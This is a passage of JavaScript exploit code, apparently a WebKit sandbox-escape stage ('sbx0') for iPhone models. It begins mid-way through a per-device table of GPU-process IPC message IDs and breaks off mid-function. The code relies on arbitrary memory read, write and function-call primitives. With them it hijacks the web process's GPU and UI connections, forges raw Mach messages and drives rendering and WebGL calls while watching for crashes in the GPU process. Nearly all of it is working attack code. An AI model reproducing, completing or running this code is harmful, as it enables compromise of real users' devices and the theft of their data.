      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,3_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,4_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,5_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   }

};

  var MessageName = sbx0_offsets[device_model];
  function LOG(msg) {
    log('sbx0: ' + msg);
  }
  const MACH_MSG_TYPE_MOVE_SEND = 0x11;
  const MACH_MSGH_BITS_COMPLEX = 0x80000000;
  const MACH_MSG_PORT_DESCRIPTOR = 0;
  const KERN_SUCCESS = 0n;
  const MACH_PORT_NULL = 0;
  const outOfLineBodyMessageID = 0xdba1dba;
  const inlineBodyMessageID = 0xdba0dba;
  const streamBufferServerOffset = 0n;
  const streamBufferClientOffset = 0x80n;
  const streamBufferDataOffset = 0x100n;
  const sizeof_mach_msg_header_t = 0x18;
  const sizeof_mach_msg_body_t = 0x4;
  const sizeof_mach_msg_port_descriptor_t = 0xc;
  const sizeof_mach_msg_ool_descriptor_t = 0x10;
  const inlineMessageMaxSize = 4096;
  const receiveBufferSize = 0x1044;
  const receiveBufferSizeAsBigInt = BigInt(receiveBufferSize);
  const receiveBuffer = new ArrayBuffer(receiveBufferSize);
  const receiveBufferU8 = new Uint8Array(receiveBuffer);
  const receiveBufferDataPointer = receiveBuffer.data();
  const __mach_task_self = read32(offsets.mach_task_self_ptr);
  const GL_VERTEX_SHADER = 0x8B31;
  const GL_FRAGMENT_SHADER = 0x8B30;
  const GL_ARRAY_BUFFER = 0x8892;
  const GL_STATIC_DRAW = 0x88E4;
  const GL_TEXTURE_2D = 0x0DE1;
  const GL_DEPTH_COMPONENT32F = 0x8CAC;
  const GL_DEPTH_COMPONENT = 0x1902;
  const GL_FLOAT = 0x1406;
  const GL_PIXEL_UNPACK_BUFFER = 0x88EC;
  const GL_UNPACK_IMAGE_HEIGHT = 0x806E;
  function ASSERT_NOT_REACHED(message) {
    log(`ASSERT_NOT_REACHED: ${message}`);
    fcall(offsets.exit, 0n);
    while (1);
  }
  function ASSERT(condition, message) {
    if (!condition) {
      log(`ASSERT: ${message}`);
      fcall(offsets.exit, 0n);
      while (1);
    }
  }
  class MachMessage {
    static safeRoundMsg(value) {
      const alignment = 8;
      return Math.floor((value + (alignment - 1)) / alignment) * alignment;
    }
    static messageSize(bodySize, portDescriptorCount, memoryDescriptorCount) {
      let messageSize = sizeof_mach_msg_header_t;
      messageSize += bodySize;
      if (portDescriptorCount || memoryDescriptorCount) {
        messageSize += sizeof_mach_msg_body_t;
        messageSize += portDescriptorCount * sizeof_mach_msg_port_descriptor_t;
        messageSize += memoryDescriptorCount * sizeof_mach_msg_ool_descriptor_t;
      }
      return MachMessage.safeRoundMsg(messageSize);
    }
  }
  ;
  class Connection {
    constructor(connection_ptr, ownership = false) {
      if (connection_ptr) {
        this.connection_ptr = connection_ptr;
        this.sendPort = read32(connection_ptr + 0x138n);
        this.receivePort = read32(connection_ptr + 0x148n);
        ASSERT(this.sendPort, "sendPort is NULL");
        ASSERT(this.receivePort, "receivePort is NULL");
        if (ownership) {
          write64(connection_ptr + 0x148n, 0n);
        }
      }
    }
    setSendPort(sendPort) {
      this.sendPort = sendPort;
    }
    createReceivePort() {
      const portBuffer = new BigUint64Array(1);
      let kr = fcall(offsets.mach_port_allocate, __mach_task_self, 1n, portBuffer.data());
      ASSERT(kr == KERN_SUCCESS, "mach_port_allocate failed");
      const receivePort = portBuffer[0];
      kr = fcall(offsets.mach_port_insert_right, __mach_task_self, receivePort, receivePort, 0x14n);
      ASSERT(kr == KERN_SUCCESS, "mach_port_insert_right failed");
      return this.receivePort = receivePort;
    }
    tryConsumeMessage() {
      while (1) {
        const kr = fcall(offsets.mach_msg_fn, receiveBufferDataPointer, 0x906n, 0n, receiveBufferSizeAsBigInt, BigInt(this.receivePort), 0n, 0n);
        if (kr == KERN_SUCCESS) {
          return true;
        } else if (kr == 0x10004003n) {
          return false;
        } else {
          ASSERT_NOT_REACHED(`tryConsumeMessage: maybe gpu dead (code: ${kr.hex()})`);
        }
      }
    }
    tryReceiveMessage() {
      let logged = false;
      while (1) {
        const kr = fcall(offsets.mach_msg_fn, receiveBufferDataPointer, 0x906n, 0n, receiveBufferSizeAsBigInt, BigInt(this.receivePort), 5000n, 0n);
        if (kr == KERN_SUCCESS) {
          const buffer = new ArrayBuffer(receiveBufferSize);
          const bufferU8 = new Uint8Array(buffer);
          bufferU8.set(receiveBufferU8);
          return new Decoder(buffer);
        } else if (kr == 0x10004003n) {
          if (!logged) {
            logged = true;
            LOG("[!] mach_msg(): process not responding");
          }
          continue;
        } else {
          ASSERT_NOT_REACHED(`tryReceiveMessage: maybe gpu dead (code: ${kr.hex()})`);
        }
      }
    }
    receiveMessage(messageName) {
      while (1) {
        const decoder = this.tryReceiveMessage();
        if (decoder.messageName == messageName) {
          return decoder;
        }
      }
    }
    receiveMessages(messageNames) {
      const result = new Array(messageNames.length);
      let count = 0;
      while (1) {
        const decoder = this.tryReceiveMessage();
        for (let i = 0; i < result.length; ++i) {
          if (!result[i] && decoder.messageName == messageNames[i]) {
            LOG(`Connection.receiveMessages(): met ${messageNames[i].toString(16)}`);
            result[i] = decoder;
            ++count;
            if (count == messageNames.length) {
              return result;
            }
          }
        }
      }
    }
    receiveSyncReply(syncRequestID) {
      while (1) {
        const decoder = this.receiveMessage(MessageName.SyncMessageReply);
        if (decoder.decode('uint64_t') == syncRequestID) return decoder;
      }
    }
    sendMessage(encoder, attachments = []) {
      const buffer = encoder.buffer();
      const numberOfPortDescriptors = attachments.length;
      let messageBodyIsOOL = false;
      let messageSize = MachMessage.messageSize(buffer.byteLength, numberOfPortDescriptors, messageBodyIsOOL);
      if (messageSize > inlineMessageMaxSize) {
        messageBodyIsOOL = true;
        messageSize = MachMessage.messageSize(0, numberOfPortDescriptors, messageBodyIsOOL);
      }
      const isComplex = numberOfPortDescriptors || messageBodyIsOOL;
      const message = new ArrayBuffer(messageSize);
      const view = new DataView(message);
      view.setUint32(0, isComplex ? 0x80000013 : 0x13, true);
      view.setUint32(4, messageSize, true);
      view.setUint32(8, Number(this.sendPort), true);
      view.setUint32(0x14, messageBodyIsOOL ? outOfLineBodyMessageID : inlineBodyMessageID, true);
      let messageOffset = 0x18;
      if (isComplex) {
        view.setUint32(messageOffset, numberOfPortDescriptors + messageBodyIsOOL, true);
        messageOffset += 4;
        for (const attachment of attachments) {
          view.setUint32(messageOffset, Number(attachment), true);
          view.setUint32(messageOffset + 4, MACH_MSG_PORT_DESCRIPTOR, true);
          view.setUint32(messageOffset + 8, MACH_MSG_TYPE_MOVE_SEND << 16, true);
          messageOffset += sizeof_mach_msg_port_descriptor_t;
        }
        if (messageBodyIsOOL) {
          view.setBigUint64(messageOffset, buffer.data(), true);
          view.setUint32(messageOffset + 8, 0x1000100, true);
          view.setUint32(messageOffset + 0xc, buffer.byteLength, true);
          messageOffset += sizeof_mach_msg_ool_descriptor_t;
        }
      }
      if (!messageBodyIsOOL) {
        const buffer_u8 = new Uint8Array(buffer);
        const message_u8 = new Uint8Array(message);
        for (let i = 0; i < buffer_u8.byteLength; ++i) {
          message_u8[messageOffset + i] = buffer_u8[i];
        }
      }
      const header = message.data();
      return fcall(offsets.mach_msg_fn, header, 145n, BigInt(messageSize), 0n, 0n, 0n, 0n);
    }
  }
  ;
  class Decoder {
    constructor(buffer) {
      this.buffer = buffer;
      this.offset = 0;
      this.view = new DataView(this.buffer);
      this.attachments = [];
      const isComplex = !!(this.view.getUint32(0, true) & MACH_MSGH_BITS_COMPLEX);
      if (isComplex) {
        const numberOfPortDescriptors = this.view.getUint32(0x18, true);
        const sizeWithPortDescriptors = sizeof_mach_msg_header_t + sizeof_mach_msg_body_t + numberOfPortDescriptors * sizeof_mach_msg_port_descriptor_t;
        let descriptorOffset = 0x1c;
        const messageBodyIsOOL = this.view.getUint32(0x14, true) == outOfLineBodyMessageID;
        this.isOOL = messageBodyIsOOL;
        const numberOfAttachments = messageBodyIsOOL ? numberOfPortDescriptors - 1 : numberOfPortDescriptors;
        for (let i = 0; i < numberOfAttachments; ++i) {
          this.attachments.push(BigInt(this.view.getUint32(descriptorOffset, true)));
          descriptorOffset += sizeof_mach_msg_port_descriptor_t;
        }
        if (messageBodyIsOOL) {
          ASSERT_NOT_REACHED("ool message is not supported");
        } else {
          this.offset = descriptorOffset;
          this.messageFlags = this.decode('uint8_t');
          this.messageName = this.decode('uint16_t');
        }
      } else if (this.view.getUint32(0x14, true) == inlineBodyMessageID) {
        this.offset += sizeof_mach_msg_header_t;
        this.messageFlags = this.decode('uint8_t');
        this.messageName = this.decode('uint16_t');
      } else {
        LOG(`unsupported message type (${this.buffer.data().hex()}) (gpu might be dead)`);
        this.messageName = 0;
      }
    }
    static argumentAlignment(type) {
      switch (type) {
        case 'uint64_t':
        case 'int64_t':
          return 8;
        case 'uint32_t':
        case 'int32_t':
          return 4;
        case 'uint16_t':
        case 'int16_t':
          return 2;
        case 'uint8_t':
        case 'int8_t':
        case 'bool':
          return 1;
        default:
          ASSERT_NOT_REACHED(`Decoder.argumentAlignment(): unexpected type name: ${type}`);
      }
    }
    static argumentSize(type) {
      switch (type) {
        case 'uint64_t':
        case 'int64_t':
          return 8;
        case 'uint32_t':
        case 'int32_t':
          return 4;
        case 'uint16_t':
        case 'int16_t':
          return 2;
        case 'uint8_t':
        case 'int8_t':
        case 'bool':
          return 1;
        default:
          ASSERT_NOT_REACHED(`Decoder.argumentSize(): unexpected type name: ${type}`);
      }
    }
    decode(type) {
      const alignment = Decoder.argumentAlignment(type);
      const remainder = this.offset % alignment;
      if (remainder) {
        this.offset += alignment - remainder;
      }
      let result;
      switch (type) {
        case 'uint64_t':
          result = this.view.getBigUint64(this.offset, true);
          break;
        case 'int64_t':
          result = this.view.getBigInt64(this.offset, true);
          break;
        case 'uint32_t':
          result = this.view.getUint32(this.offset, true);
          break;
        case 'int32_t':
          result = this.view.getInt32(this.offset, true);
          break;
        case 'uint16_t':
          result = this.view.getUint16(this.offset, true);
          break;
        case 'int16_t':
          result = this.view.getInt16(this.offset, true);
          break;
        case 'uint8_t':
          result = this.view.getUint8(this.offset);
          break;
        case 'int8_t':
          result = this.view.getInt8(this.offset);
          break;
        case 'bool':
          result = !!this.view.getInt8(this.offset);
          break;
        default:
          ASSERT_NOT_REACHED(`Decoder.decode(): unexpected type name: ${arg.type}`);
      }
      this.offset += Decoder.argumentSize(type);
      return result;
    }
    decode8BitString() {
      const length = this.decode('uint32_t');
      const is8Bit = this.decode('bool');
      ASSERT(is8Bit, "encountered 16 bits string");
      const result = this.buffer.slice(this.offset, this.offset + length);
      this.offset += length;
      return result;
    }
  }
  ;
  class SharedBuffer {
    constructor(size) {
      const addressBuffer = new BigUint64Array(1);
      let kr = fcall(offsets.vm_allocate_fn, __mach_task_self, addressBuffer.data(), size, 3n);
      ASSERT(kr == KERN_SUCCESS, "vm_allocate failed");
      const address = addressBuffer[0];
      const sizeBuffer = new BigUint64Array(1);
      sizeBuffer[0] = size;
      const portBuffer = new BigUint64Array(1);
      kr = fcall(offsets.mach_make_memory_entry_64_fn, __mach_task_self, sizeBuffer.data(), address, 0x500043n, portBuffer.data(), 0n);
      ASSERT(kr == KERN_SUCCESS, "mach_make_memory_entry_64 failed");
      this.address = address;
      this.port = portBuffer[0];
      this.size = size;
    }
  }
  ;
  class StreamClientConnection extends Connection {
    constructor(identifier, bufferSize) {
      super(0n);
      this.identifier = identifier;
      this.buffer = new SharedBuffer(bufferSize);
      const portBuffer = new BigUint64Array(1);
      let kr = fcall(offsets.mach_port_allocate, __mach_task_self, 1n, portBuffer.data());
      ASSERT(kr == KERN_SUCCESS, "mach_port_allocate failed");
      const receivePort = portBuffer[0];
      kr = fcall(offsets.mach_port_insert_right, __mach_task_self, receivePort, receivePort, 0x14n);
      ASSERT(kr == KERN_SUCCESS, "mach_port_insert_right failed");
      this.receivePort = receivePort;
      this.setClientOffset(0x80000000n);
      this.destinationID = 0n;
    }
    setClientOffset(offset) {
      write64(this.buffer.address + streamBufferClientOffset, offset);
    }
    clientOffset() {
      return read32(this.buffer.address + streamBufferClientOffset);
    }
    serverOffset() {
      return read32(this.buffer.address + streamBufferServerOffset);
    }
    setSemaphores(wakeUpSemaphore, clientWaitSemaphore) {
      this.wakeUpSemaphore = wakeUpSemaphore;
      this.clientWaitSemaphore = clientWaitSemaphore;
    }
    waitForServer(timeout) {
      const begin = performance.now();
      const address = this.buffer.address + streamBufferClientOffset;
      read64_biguint64arr[1] = address;
      while (read64_str.charCodeAt(1) != 0x8000) {
        if (performance.now() - begin > timeout) {
          return false;
        }
      }
      return true;
    }
    sendOutOfStreamMessage(encoder) {
      this.sendMessage(encoder);
      this.processOutOfStreamMessage();
      return;
    }
    sendOutOfStreamMessageAndWait(encoder, timeout = Infinity) {
      this.sendMessage(encoder);
      this.processOutOfStreamMessage();
      return this.waitForServer(timeout);
    }
    processOutOfStreamMessage() {
      this.waitForServer(Infinity);
      ASSERT(this.clientOffset() == 0x80000000n, "clientOffset is not 0x80000000");
      let offset = this.serverOffset();
      if (offset % 2n) {
        offset += 1n;
      }
      write64(this.buffer.address + streamBufferDataOffset + offset, BigInt(MessageName.ProcessOutOfStreamMessage));
      offset += 0x10n;
      this.setClientOffset(offset);
      fcall(offsets.semaphore_signal, this.wakeUpSemaphore);
    }
    processOutOfStreamMessageAndWait(timeout=Infinity) {
      this.processOutOfStreamMessage();
      this.waitForServer(timeout);
    }
  }
  ;
  function read_hashmap(map_ptr, key_size = 8n, element_size = 8n) {
    const map_length = read64(map_ptr - 8n) >> 32n;
    const entry_size = key_size + element_size;
    const buffer_size = entry_size * map_length;
    const res = new Map();
    for (let offset = 0n; offset < buffer_size; offset += entry_size) {
      const key = read64(map_ptr + offset);
      if (key && key != 0xffffffffffffffffn) {
        const value = read64(map_ptr + offset + key_size);
        res.set(key, value);
      }
    }
    return res;
  }
  let identifier = 0xffffffffn;
  function nextIdentifier() {
    return identifier++;
  }
  const crash_timeout = 100;
  const runLoopHolder_tid = read64(offsets.runLoopHolder_tid);
  LOG(`runLoopHolder_tid: ${runLoopHolder_tid.hex()}`);
  const webProcess = read64(offsets.WebProcess_singleton);
  LOG(`webProcess: ${webProcess.hex()}`);
  const pageMap = read64(webProcess + 0x78n);
  const pageMapData = read_hashmap(pageMap);
  const webPages = [...pageMapData.values()];
  for (const webPage of webPages) {
    LOG(`webPage: ${webPage.hex()}`);
    let m_drawingArea = read64(webPage + offsets.m_drawingArea);
    LOG(`\tm_drawingArea: ${m_drawingArea.hex()}`);
    let m_isRenderingSuspended = read64(m_drawingArea + offsets.m_isRenderingSuspended);
    LOG(`\tm_isRenderingSuspended: ${m_isRenderingSuspended.hex()}`);
    write64(m_drawingArea + offsets.m_isRenderingSuspended, m_isRenderingSuspended & 0xffffffffffffff00n | 0x01n);
  }
  const renderingBackendConnections = [];
  for (const webPage of webPages) {
    const remoteRenderingBackendProxy = read64(webPage + offsets.RemoteRenderingBackendProxy_off);
    LOG(`-> remoteRenderingBackendProxy: ${remoteRenderingBackendProxy.hex()}`);
    const streamConnection = read64(remoteRenderingBackendProxy + 0x40n);
    LOG(`-> streamConnection: ${streamConnection.hex()}`);
    const connection = read64(streamConnection + 8n);
    LOG(`-> connection: ${connection.hex()}`);
    renderingBackendConnections.push(new Connection(connection, true, "renderingBackendConnection"));
  }
  let gpuProcessConnection = read64(webProcess + offsets.m_gpuProcessConnection);
  let gpuConnection = new Connection(read64(gpuProcessConnection + 0x20n), true, 'first gpuConnection');
  const firstGpuConnection = gpuConnection;
  write64(webProcess + offsets.m_gpuProcessConnection, 0n);
  let uiProcessConnection = read64(webProcess + offsets.UI_m_connection);
  LOG(`uiProcessConnection: ${uiProcessConnection.hex()}`);
  let uiConnection = new Connection(uiProcessConnection, false);
  let gpuProcessConnectionIdentifier = read64(gpuProcessConnection + offsets.m_gpuProcessConnection_m_identifier);
  let retry_count = 0;
  (function SBX0() {
    LOG(`[+] SBX0() (retry: ${retry_count++})`);
    function GPUConnectionToWebProcess_CreateRenderingBackend(backendConnection) {
      gpuConnection.sendMessage(new Encoder(MessageName.GPUConnectionToWebProcess_CreateRenderingBackend, 0n).encode('uint64_t', backendConnection.identifier).encode('uint64_t', backendConnection.buffer.size), [backendConnection.receivePort, backendConnection.buffer.port]);
      const decoders = backendConnection.receiveMessages([MessageName.RemoteRenderingBackendProxy_DidInitialize, MessageName.InitializeConnection]);
      backendConnection.setSemaphores(decoders[0].attachments[0], decoders[0].attachments[1]);
      backendConnection.setSendPort(decoders[1].attachments[0]);
      LOG("RemoteRenderingBackend created");
    }
    function GPUConnectionToWebProcess_CreateGraphicsContextGL() {
      gpuConnection.sendMessage(new Encoder(MessageName.GPUConnectionToWebProcess_CreateGraphicsContextGL, 0n).encode('uint64_t', glConnection.identifier).encode('bool', false).encode('bool', false).encode('bool', false).encode('bool', false).encode('bool', false).encode('bool', false).encode('uint8_t', 0).encode('bool', true).encode('bool', true).encode('uint8_t', 0).encode('uint64_t', backendConnection.identifier).encode('uint64_t', glConnection.buffer.size), [glConnection.receivePort, glConnection.buffer.port]);
      const decoders = glConnection.receiveMessages([MessageName.RemoteGraphicsContextGLProxy_WasCreated, MessageName.InitializeConnection]);
      glConnection.setSemaphores(decoders[0].attachments[0], decoders[0].attachments[1]);
      glConnection.setSendPort(decoders[1].attachments[0]);
      LOG("RemoteGraphicsContextGL created");
    }
    function WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive() {
      uiConnection.sendMessage(new Encoder(MessageName.WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive, 0n).encode('uint64_t', gpuProcessConnectionIdentifier));
    }
    function RemoteRenderingBackend_CacheFont() {
      let requested_cache_id = nextIdentifier();
      backendConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteRenderingBackend_CacheFont, backendConnection.identifier).encode('uint8_t', 1).encode('uint64_t', requested_cache_id).encode('uint8_t', 1).encode('uint8_t', 0).encode('uint8_t', 0).encode('uint8_t', 0).encode('float', 10).encode('uint8_t', 0).encode('uint8_t', 0).encode('uint8_t', 0).encode('uint8_t', 0).encode('uint8_t', 0).encode('uint8_t', 0).encode('uint32_t', 0x80010000).encode8BitString('file:///System/Library/Fonts/Core/Helvetica.ttc#postscript-name=Helvetica').encode8BitString('Helvetica').encode('uint8_t', 0));
      return requested_cache_id;
    }
    function RemoteRenderingBackend_CreateImageBuffer(backendConnection, width, height) {
      const imageBufferIdentifier = nextIdentifier();
      backendConnection.sendMessage(new Encoder(MessageName.RemoteRenderingBackend_CreateImageBuffer, backendConnection.identifier).encode('float', width).encode('float', height).encode('uint8_t', 1).encode('uint8_t', 1).encode('float', 1).encode('uint8_t', 0).encode('uint8_t', 7).encode('uint8_t', 1).encode('uint64_t', imageBufferIdentifier));
      backendConnection.processOutOfStreamMessage();
      const decoder = backendConnection.receiveMessage(MessageName.RemoteImageBufferProxy_DidCreateBackend);
      const port = decoder.attachments[0];
      ASSERT(port != MACH_PORT_NULL, "RemoteRenderingBackend_CreateImageBuffer(): port is NULL");
      return imageBufferIdentifier;
    }
    function RemoteRenderingBackend_ReleaseImageBuffer(backendConnection, imageBufferIdentifier) {
      backendConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteRenderingBackend_ReleaseImageBuffer, backendConnection.identifier).encode('uint64_t', imageBufferIdentifier));
    }
    function RemoteRenderingBackend_ReleaseImageBuffer_NoWait(backendConnection, imageBufferIdentifier) {
      backendConnection.sendOutOfStreamMessage(new Encoder(MessageName.RemoteRenderingBackend_ReleaseImageBuffer, backendConnection.identifier).encode('uint64_t', imageBufferIdentifier));
    }
    function RemoteImageBuffer_PutPixelBuffer(imageID, width, height) {
      const data = new Uint8Array(width * height * 4).fill(0x01);
      backendConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteImageBuffer_PutPixelBuffer, imageID).encode('uint8_t', 0x00).encode('uint8_t', 0x01).encode('uint8_t', 0x0).encode('uint8_t', 0).encode('uint8_t', 0x11).encode('uint32_t', width).encode('uint32_t', height).encode('uint64_t', BigInt(data.byteLength)).encode('bytes', data).encode('uint32_t', 0x0).encode('uint32_t', 0x0).encode('uint32_t', width).encode('uint32_t', height).encode('uint32_t', 0x0).encode('uint32_t', 0x0).encode('uint8_t', 0x0));
    }
    function RemoteDisplayListRecorder_DrawGlyphs(imageBufferID, cache_id, glyphs_u8, advances_u8, length, timeout = Infinity, x = 0, y = 0) {
      const encoder = new Encoder(MessageName.RemoteDisplayListRecorder_DrawGlyphs, imageBufferID);
      encoder.encode('uint64_t', cache_id);
      encoder.encode('uint64_t', BigInt(length));
      encoder.encode('bytes', glyphs_u8);
      encoder.encode('uint64_t', BigInt(length));
      encoder.encode('bytes', advances_u8);
      encoder.encode('float', x);
      encoder.encode('float', y);
      encoder.encode('uint8_t', 0);
      if (!backendConnection.sendOutOfStreamMessageAndWait(encoder, timeout = timeout)) {
        LOG(`Crash detected during DrawGlyphs call`);
        return false;
      }
      return true;
    }
    function RemoteDisplayListRecorder_FillRect(imageBufferID, rect0 = 0, rect1 = 0, rect2 = 0, rect3 = 0, requiresClipToRect = true, timeout = Infinity) {
      if (!backendConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteDisplayListRecorder_FillRect, imageBufferID).encode('uint32_t', rect0).encode('uint32_t', rect1).encode('uint32_t', rect2).encode('uint32_t', rect3).encode('bool', requiresClipToRect), timeout)) {
        LOG(`Crash detected during FillRect call`);
        return false;
      }
      return true;
    }
    function RemoteDisplayListRecorder_StrokeRect(imageBufferID, rect0, rect1, rect2, rect3, lineWidth, timeout = Infinity) {
      if (!backendConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteDisplayListRecorder_StrokeRect, imageBufferID).encode('uint32_t', rect0).encode('uint32_t', rect1).encode('uint32_t', rect2).encode('uint32_t', rect3).encode('uint32_t', lineWidth), timeout)) {
        LOG(`Crash detected during StrokeRect call`);
        return false;
      }
      return true;
    }
    function RemoteDisplayListRecorder_SetCTM(imageBufferID, ctm0, ctm1, ctm2, ctm3, ctm4, ctm5) {
      backendConnection.sendOutOfStreamMessageAndWait(new Encoder(MessageName.RemoteDisplayListRecorder_SetCTM, imageBufferID).encode('uint64_t', ctm0).encode('uint64_t', ctm1).encode('uint64_t', ctm2).encode('uint64_t', ctm3).encode('uint64_t', ctm4).encode('uint64_t', ctm5));
    }
    function RemoteGraphicsContextGL_Reshape(width = 1, height = 1) {
